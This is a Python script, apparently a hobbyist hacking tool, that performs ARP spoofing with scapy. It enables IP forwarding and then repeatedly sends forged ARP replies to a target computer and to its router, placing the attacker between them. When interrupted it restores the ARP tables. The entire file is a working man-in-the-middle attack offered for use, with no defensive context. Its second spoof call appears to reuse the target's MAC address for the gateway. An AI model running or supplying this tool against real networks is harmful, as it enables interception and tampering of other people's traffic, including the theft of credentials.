import scapy.all as scapy, time, subprocess, argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest="target_ip", help='[+] -t Ip for the computer.')
    parser.add_argument('-g', '--getway', dest="getway_ip", help="[+] -g specify ip of the router.")
    parser.add_argument('-d', '--destination', dest="hw_destination", help="[+] -d The mac address of the target computer.")
    parser.add_argument('-s', '--hw_source', dest="hw_source", help="[+] -s The mac address of the router.")

    options = parser.parse_args()
    return options

def arp_spoof(target_ip, spoof_ip, hw_destination):
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    packet = scapy.ARP(op=2, pdst= target_ip, hwdst=hw_destination, psrc= spoof_ip)
    scapy.send(packet, verbose=False)

def restore(target_ip, source_ip, hw_destination, hw_source):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=hw_destination, psrc=source_ip, hwsrc=hw_source)
    scapy.send(packet, count=4, verbose=False)
    

options = get_arguments()
time_count = 0
try:
    while True:
        arp_spoof(options.target_ip, options.getway_ip, options.hw_destination)
        arp_spoof(options.getway_ip, options.target_ip, options.hw_destination)
        time_count += 2
        print(f"\r[+] Packets Sent: [ {time_count} ]", end="")
        time.sleep(2)

except KeyboardInterrupt:
    print('\n[-] Detected CTRL-C ... Restorering ARP tables!')
    restore(options.target_ip, options.getway_ip, options.hw_destination, options.hw_source)
    restore(options.getway_ip, options.target_ip, options.hw_destination, options.hw_source)